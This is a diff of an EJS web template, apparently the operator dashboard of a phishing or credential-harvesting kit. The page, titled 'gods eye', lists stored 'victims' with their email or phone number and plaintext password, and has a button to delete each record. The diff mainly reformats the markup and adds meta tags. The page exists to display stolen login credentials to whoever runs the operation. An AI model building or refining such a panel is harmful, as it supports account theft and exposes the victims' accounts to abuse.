@@ -1,32 +1,38 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>View Victims</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>gods eye</title>
     <link rel="stylesheet" href="/css/view-victim.css">
 </head>
 <body>
-    <div class="gods-eye">
-    <h2>Your gods eye</h2>
-    <a href="/dashboard" class="back-to-dashboard">Back to Dashboard</a>
+    
 
-    <ul>
-        <% if (victims && victims.length > 0) { %>
-            <% victims.forEach(victim => { %>
-                <li>
-                    <div class="details">
-                        <strong>Email/Number:</strong> <%= victim.emailOrNumber %>
-                        <strong>Password:</strong> <%= victim.password %>
-                    </div>
-                    <form action="/delete-victim/<%= victim._id %>" method="POST" style="display:inline;">
-                        <button type="submit">Delete</button>
-                    </form>
-                </li>
-                
-                <% }); %>
-                <% } else { %>
-                    <p>No victim data found.</p>
-                    <% } %>
-    </ul>
-</div>
+    <div class="gods-eye">
+        <h2>Your gods eye</h2>
+        <a href="/dashboard" class="back-to-dashboard">Back to Dashboard</a>
+    
+        <ul>
+            <% if (victims && victims.length > 0) { %>
+                <% victims.forEach(victim => { %>
+                    <li>
+                        <div class="details">
+                            <strong>Email/Number: <p><%= victim.emailOrNumber %></p></strong>
+                            <strong>Password: <p><%= victim.password %></p></strong>
+                        </div>
+                        <form action="/delete-victim/<%= victim._id %>" method="POST" style="display:inline;">
+                            <button type="submit">Delete</button>
+                        </form>
+                    </li>
+                    
+                    <% }); %>
+                    <% } else { %>
+                        <p>No victim data found.</p>
+                        <% } %>
+        </ul>
+    </div>
+
+
 </body>
 </html>
